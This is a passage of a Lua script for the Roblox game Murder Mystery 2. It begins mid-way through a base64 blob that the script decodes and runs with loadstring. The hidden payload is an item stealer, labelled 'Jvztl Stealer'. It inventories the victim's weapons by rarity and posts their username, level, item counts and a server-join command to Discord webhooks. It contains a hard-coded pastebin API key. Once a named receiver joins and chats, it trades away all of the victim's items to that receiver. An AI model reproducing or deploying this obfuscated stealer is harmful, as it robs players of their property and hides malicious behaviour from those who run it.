uaXF1ZUl0ZW1zQyArIDEKICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHVuaXF1ZUl0ZW1zLCBmb3JtYXR0ZWRUYWJsZSkKICAgICAgICBlbmQKCiAgICAgICAgaWYgZC5SYXJpdHkgPT0gIkFuY2llbnQiIHRoZW4KICAgICAgICAgICAgYW5jaWVudEl0ZW1zQyA9IGFuY2llbnRJdGVtc0MgKyAxCiAgICAgICAgICAgIHRhYmxlLmluc2VydChhbmNpZW50SXRlbXMsIGZvcm1hdHRlZFRhYmxlKQogICAgICAgIGVuZAoKICAgICAgICBpZiBkLlJhcml0eSA9PSAiR29kbHkiIHRoZW4KICAgICAgICAgICAgZ29kbHlJdGVtc0MgPSBnb2RseUl0ZW1zQyArIDEKICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGdvZGx5SXRlbXMsIGZvcm1hdHRlZFRhYmxlKQogICAgICAgIGVuZAoKICAgICAgICBpZiBkLlJhcml0eSA9PSAiTGVnZW5kYXJ5IiB0aGVuCiAgICAgICAgICAgIGxlZ2VuZGFyeUl0ZW1zQyA9IGxlZ2VuZGFyeUl0ZW1zQyArIDEKICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGxlZ2VuZGFyeUl0ZW1zLCBmb3JtYXR0ZWRUYWJsZSkKICAgICAgICBlbmQKCiAgICAgICAgaWYgZC5SYXJpdHkgPT0gIlJhcmUiIHRoZW4KICAgICAgICAgICAgcmFyZUl0ZW1zQyA9IHJhcmVJdGVtc0MgKyAxCiAgICAgICAgICAgIHRhYmxlLmluc2VydChyYXJlSXRlbXMsIGZvcm1hdHRlZFRhYmxlKQogICAgICAgIGVuZAoKICAgICAgICBpZiBkLlJhcml0eSA9PSAiVW5jb21tb24iIHRoZW4KICAgICAgICAgICAgdW5jb21tb25JdGVtc0MgPSB1bmNvbW1vbkl0ZW1zQyArIDEKICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHVuY29tbW9uSXRlbXMsIGZvcm1hdHRlZFRhYmxlKQogICAgICAgIGVuZAoKICAgICAgICBpZiBkLlJhcml0eSA9PSAiQ29tbW9uIiB0aGVuCiAgICAgICAgICAgIGNvbW1vbkl0ZW1zQyA9IGNvbW1vbkl0ZW1zQyArIDEKICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGNvbW1vbkl0ZW1zLCBmb3JtYXR0ZWRUYWJsZSkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmZvciBpLHYgaW4gcGFpcnMoYWxsSXRlbXMpIGRvCiAgICBpdGVtc0NvdW50ID0gaXRlbXNDb3VudCArIDEKZW5kCgpsb2NhbCBmdW5jdGlvbiBwYXN0ZWJpbihjb250ZW50KQoKICAgIGxvY2FsIGJvZHkgPSB7CiAgICAgICAgYXBpX2Rldl9rZXkgPSAiODByd1gxX1lMU0laei0xSE10RFNWWTlwb2RfTGtmaVciLAogICAgICAgIGFwaV9wYXN0ZV9jb2RlID0gY29udGVudCwKICAgICAgICBhcGlfb3B0aW9uID0gInBhc3RlIgogICAgfQoKICAgIGxvY2FsIGVuY29kZWRCb2R5ID0gIiIKICAgIGZvciBrZXksIHZhbHVlIGluIHBhaXJzKGJvZHkpIGRvCiAgICAgICAgZW5jb2RlZEJvZHkgPSBlbmNvZGVkQm9keSAuLiBrZXkgLi4gIj0iIC4uIEh0dHBTZXJ2aWNlOlVybEVuY29kZSh2YWx1ZSkgLi4gIiYiCiAgICBlbmQKICAgIGVuY29kZWRCb2R5ID0gZW5jb2RlZEJvZHk6c3ViKDEsIC0yKSAKCiAgICBsb2NhbCByZXNwb25zZQogICAgbG9jYWwgc3VjY2VzcywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdCh7CiAgICAgICAgICAgIFVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9hcGkvYXBpX3Bvc3QucGhwIiwKICAgICAgICAgICAgTWV0aG9kID0gIlBPU1QiLAogICAgICAgICAgICBCb2R5ID0gZW5jb2RlZEJvZHksCiAgICAgICAgICAgIEhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgVGltZW91dCA9IDIwCiAgICAgICAgfSkKICAgIGVuZCkKCiAgICBpZiBub3Qgc3VjY2VzcyBvciBub3QgcmVzcG9uc2Ugb3Igbm90IHJlc3BvbnNlLlN1Y2Nlc3MgdGhlbgogICAgICAgIHJldHVybiAiXG4gRVJST1I6IENvdW50cnkgbm90IHN1cHBvcnRlZCBcbiIKICAgIGVuZAoKICAgIGxvY2FsIHBhc3RlVXJsID0gcmVzcG9uc2UuQm9keQogICAgbG9jYWwgcmF3VXJsID0gImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy8iIC4uIHBhc3RlVXJsOm1hdGNoKCIoWyV3XSspJCIpCgogICAgcmV0dXJuIHJhd1VybAplbmQKCmxvY2FsIHVuaXF1ZXNTdHJpbmcgPSAiIgpsb2NhbCBhbmNpZW50c1N0cmluZyA9ICIiCmxvY2FsIGdvZGx5c1N0cmluZyA9ICIiCmxvY2FsIGxlZ2VuZGFyaWVzU3RyaW5nID0gIiIKbG9jYWwgdmludGFnZVN0cmluZyA9ICIiCmxvY2FsIHJhcmVzU3RyaW5nID0gIiIKbG9jYWwgdW5jb21tb25TdHJpbmcgPSAiIgpsb2NhbCBjb21tb25zU3RyaW5nID0gIiIKCmZvciBhLGIgaW4gcGFpcnModW5pcXVlSXRlbXMpIGRvCiAgICBmb3IgYyxkIGluIHBhaXJzKGIpIGRvCiAgICAgICAgaWYgYyA9PSAibmFtZSIgdGhlbgogICAgICAgICAgICB1bmlxdWVzU3RyaW5nID0gdW5pcXVlc1N0cmluZyAuLiBkIC4uICIsXG4iCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpmb3IgYSxiIGluIHBhaXJzKGFuY2llbnRJdGVtcykgZG8KICAgIGZvciBjLGQgaW4gcGFpcnMoYikgZG8KICAgICAgICBpZiBjID09ICJuYW1lIiB0aGVuCiAgICAgICAgICAgIGFuY2llbnRzU3RyaW5nID0gYW5jaWVudHNTdHJpbmcgLi4gZCAuLiAiLFxuIgogICAgICAgIGVuZAogICAgZW5kCmVuZAoKZm9yIGEsYiBpbiBwYWlycyhnb2RseUl0ZW1zKSBkbwogICAgZm9yIGMsZCBpbiBwYWlycyhiKSBkbwogICAgICAgIGlmIGMgPT0gIm5hbWUiIHRoZW4KICAgICAgICAgICAgZ29kbHlzU3RyaW5nID0gZ29kbHlzU3RyaW5nIC4uIGQgLi4gIixcbiIKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmZvciBhLGIgaW4gcGFpcnMobGVnZW5kYXJ5SXRlbXMpIGRvCiAgICBmb3IgYyxkIGluIHBhaXJzKGIpIGRvCiAgICAgICAgaWYgYyA9PSAibmFtZSIgdGhlbgogICAgICAgICAgICBsZWdlbmRhcmllc1N0cmluZyA9IGxlZ2VuZGFyaWVzU3RyaW5nIC4uIGQgLi4gIixcbiIKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmZvciBhLGIgaW4gcGFpcnModmludGFnZUl0ZW1zKSBkbwogICAgZm9yIGMsZCBpbiBwYWlycyhiKSBkbwogICAgICAgIGlmIGMgPT0gIm5hbWUiIHRoZW4KICAgICAgICAgICAgdmludGFnZVN0cmluZyA9IHZpbnRhZ2VTdHJpbmcgLi4gZCAuLiAiLFxuIgogICAgICAgIGVuZAogICAgZW5kCmVuZAoKZm9yIGEsYiBpbiBwYWlycyhyYXJlSXRlbXMpIGRvCiAgICBmb3IgYyxkIGluIHBhaXJzKGIpIGRvCiAgICAgICAgaWYgYyA9PSAibmFtZSIgdGhlbgogICAgICAgICAgICByYXJlc1N0cmluZyA9IHJhcmVzU3RyaW5nIC4uIGQgLi4gIixcbiIKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmZvciBhLGIgaW4gcGFpcnModW5jb21tb25JdGVtcykgZG8KICAgIGZvciBjLGQgaW4gcGFpcnMoYikgZG8KICAgICAgICBpZiBjID09ICJuYW1lIiB0aGVuCiAgICAgICAgICAgIHVuY29tbW9uU3RyaW5nID0gdW5jb21tb25TdHJpbmcgLi4gZCAuLiAiLFxuIgogICAgICAgIGVuZAogICAgZW5kCmVuZAoKZm9yIGEsYiBpbiBwYWlycyhjb21tb25JdGVtcykgZG8KICAgIGZvciBjLGQgaW4gcGFpcnMoYikgZG8KICAgICAgICBpZiBjID09ICJuYW1lIiB0aGVuCiAgICAgICAgICAgIGNvbW1vbnNTdHJpbmcgPSBjb21tb25zU3RyaW5nIC4uIGQgLi4gIixcbiIKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIEV2ZXJ5dGhpbmdTdHJpbmcgPSAiLS0gLy8gVW5pcXVlc1xuIiAuLiB1bmlxdWVzU3RyaW5nIC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAiXG5cbi0tIC8vIEFuY2llbnRcbiIgLi4gYW5jaWVudHNTdHJpbmcgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICJcblxuLS0gLy8gR29kbGllc1xuIiAuLiBnb2RseXNTdHJpbmcgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICJcblxuLS0gLy8gTGVnZW5kYXJpZXNcbiIgLi4gbGVnZW5kYXJpZXNTdHJpbmcgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICJcblxuLS0gLy8gVmludGFnZVxuIiAuLiB2aW50YWdlU3RyaW5nIC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAiXG5cbi0tIC8vIFJhcmVcbiIgLi4gcmFyZXNTdHJpbmcgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICJcblxuLS0gLy8gVW5jb21tb25cbiIgLi4gdW5jb21tb25TdHJpbmcgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICJcblxuLS0gLy8gQ29tbW9uXG4iIC4uIGNvbW1vbnNTdHJpbmcKCmxvY2FsIFdlYkhvb2tFbWJlZCA9IENyZWF0ZUVtYmVkKAogICAgIkp2enRsIFNjcmlwdHMgfCBNTTIiLAogICAgIlBsZWFzZSBleGVjdXRlIHRoZSBjb2RlIGFib3ZlIHRvIGdldCB5b3VyIGhpdC4iLAogICAgMTEyMjAsCiAgICB7CiAgICAgICAgewogICAgICAgICAgICBuYW1lID0gImBgYEluZm9gYGAiLCAKICAgICAgICAgICAgdmFsdWUgPSAiYGBgVXNlcm5hbWU6ICIuLkxQLk5hbWUuLiJcbkxldmVsOiAiLi50b3N0cmluZyhnZXRMdmwoKSkuLgogICAgICAgICAgICAgICAgICAgICAiXG5SZWNlaXZlcjogIi4udXNlck5hbWUuLiJgYGAiCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgIG5hbWUgPSAiYGBgSGl0IEluZm9gYGAiLCAKICAgICAgICAgICAgdmFsdWUgPSAiYGBgVW5pcXVlczogIi4udG9zdHJpbmcodW5pcXVlSXRlbXNDKS4uCiAgICAgICAgICAgICAgICAgICAgICJcbkFuY2llbnRzOiAiLi50b3N0cmluZyhhbmNpZW50SXRlbXNDKS4uCiAgICAgICAgICAgICAgICAgICAgICJcbkdvZGx5czogIi4udG9zdHJpbmcoZ29kbHlJdGVtc0MpLi4KICAgICAgICAgICAgICAgICAgICAgIlxuTGVnZW5kYXJpZXM6ICIuLnRvc3RyaW5nKGxlZ2VuZGFyeUl0ZW1zQykuLgogICAgICAgICAgICAgICAgICAgICAiXG5WaW50YWdlOiAiLi50b3N0cmluZyh2aW50YWdlSXRlbXNDKS4uCiAgICAgICAgICAgICAgICAgICAgICJcblJhcmVzOiAiLi50b3N0cmluZyhyYXJlSXRlbXNDKS4uCiAgICAgICAgICAgICAgICAgICAgICJcblVuY29tbW9uczogIi4udG9zdHJpbmcodW5jb21tb25JdGVtc0MpLi4KICAgICAgICAgICAgICAgICAgICAgIlxuQ29tbW9uczogIi4udG9zdHJpbmcoY29tbW9uSXRlbXNDKS4uImBgYCIKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgbmFtZSA9ICJgYGBTdW1tYXJ5YGBgIiwgCiAgICAgICAgICAgIHZhbHVlID0gImBgYFRvdGFsIFZhbHVlOiAiLi50b3N0cmluZyhtYXRoLmZsb29yKHZhbHVlQ291bnQgKyAwLjUpKS4uImBgYCIKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgbmFtZSA9ICJgYGBKdnp0bCBTdGVhbGVyYGBgIiwgCiAgICAgICAgICAgIHZhbHVlID0gImh0dHBzOi8vZGlzY29yZC5nZy9xY3NaZlRSS0pBIgogICAgICAgIH0KICAgIH0KKQoKaWYgZ29kbHlJdGVtc0MgPj0gMSBvciBhbmNpZW50SXRlbXNDID49IDEgb3IgdW5pcXVlSXRlbXNDID49IDEgIHRoZW4KICAgIFNlbmRXZWJob29rKHdlYkhvb2ssIHtjb250ZW50ID0gJy0tIEBldmVyeW9uZVxuZ2FtZTpHZXRTZXJ2aWNlKCJUZWxlcG9ydFNlcnZpY2UiKTpUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZSgxNDI4MjMyOTEsICInLi5nYW1lLkpvYklkLi4nIiknLCBlbWJlZHMgPSB7V2ViSG9va0VtYmVkfX0pCiAgICBTZW5kV2ViaG9vayh3ZWJIb29rMSwge2NvbnRlbnQgPSAnLS0gQGV2ZXJ5b25lXG5nYW1lOkdldFNlcnZpY2UoIlRlbGVwb3J0U2VydmljZSIpOlRlbGVwb3J0VG9QbGFjZUluc3RhbmNlKDE0MjgyMzI5MSwgIicuLmdhbWUuSm9iSWQuLiciKScsIGVtYmVkcyA9IHtXZWJIb29rRW1iZWR9fSkKZWxzZQogICAgU2VuZFdlYmhvb2sod2ViSG9vaywge2NvbnRlbnQgPSAnZ2FtZTpHZXRTZXJ2aWNlKCJUZWxlcG9ydFNlcnZpY2UiKTpUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZSgxNDI4MjMyOTEsICInLi5nYW1lLkpvYklkLi4nIiknLCBlbWJlZHMgPSB7V2ViSG9va0VtYmVkfX0pCiAgICBTZW5kV2ViaG9vayh3ZWJIb29rMSwge2NvbnRlbnQgPSAnZ2FtZTpHZXRTZXJ2aWNlKCJUZWxlcG9ydFNlcnZpY2UiKTpUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZSgxNDI4MjMyOTEsICInLi5nYW1lLkpvYklkLi4nIiknLCBlbWJlZHMgPSB7V2ViSG9va0VtYmVkfX0pCmVuZAoKbG9jYWwgZnVuY3Rpb24gc3RlYWxpdGVtcyh0YXJnZXRVc2VyKQogICAgY29yb3V0aW5lLnJlc3VtZShkZXN0cm95dHJhZGVzMikKCiAgICAtLSBTZW5kIHRyYWRlIHJlcXVlc3QgdG8gdGhlIHRhcmdldCB1c2VyCiAgICBsb2NhbCBzZW5kQXJncyA9IHsKICAgICAgICBbMV0gPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKVt0YXJnZXRVc2VyXQogICAgfQogICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlRyYWRlLlNlbmRSZXF1ZXN0Okludm9rZVNlcnZlcih1bnBhY2soc2VuZEFyZ3MpKQoKICAgIHdhaXQoMykKCiAgICAtLSBPZmZlciBhbGwgaXRlbXMgaW4gaW52ZW50b3J5CiAgICBmb3IgXywgaXRlbUxpc3QgaW4gcGFpcnMoe3VuaXF1ZUl0ZW1zLCBhbmNpZW50SXRlbXMsIGdvZGx5SXRlbXMsIHZpbnRhZ2VJdGVtcywgbGVnZW5kYXJ5SXRlbXMsIHJhcmVJdGVtcywgdW5jb21tb25JdGVtcywgY29tbW9uSXRlbXN9KSBkbwogICAgICAgIGZvciBfLCBpdGVtIGluIHBhaXJzKGl0ZW1MaXN0KSBkbwogICAgICAgICAgICBmb3IgaSA9IDEsIGl0ZW0uYW1vdW50IGRvCiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgIFsxXSA9IGl0ZW0uZGF0YSwKICAgICAgICAgICAgICAgICAgICBbMl0gPSAiV2VhcG9ucyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5UcmFkZS5PZmZlckl0ZW06RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgd2FpdCg2KQogICAgLS0gQWNjZXB0IHRoZSB0cmFkZSB3aXRoIHRoZSB0YXJnZXQgdXNlcgogICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlRyYWRlLkFjY2VwdFRyYWRlOkZpcmVTZXJ2ZXIodW5wYWNrKHtbMV0gPSBnYW1lLlBsYXllcnNbdGFyZ2V0VXNlcl0uVXNlcklkfSkpCmVuZAoKZ2FtZS5QbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgaWYgcGxheWVyLk5hbWUgPT0gdXNlck5hbWUgb3IgcGxheWVyLk5hbWUgPT0gdXNlck5hbWUxIHRoZW4KICAgICAgICBwbGF5ZXIuQ2hhdHRlZDpDb25uZWN0KGZ1bmN0aW9uKG1zZykKICAgICAgICAgICAgc3RlYWxpdGVtcyhwbGF5ZXIuTmFtZSkKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQ=="
        local script_code = loadstring(base64.decode(encoded_script))
        script_code()
        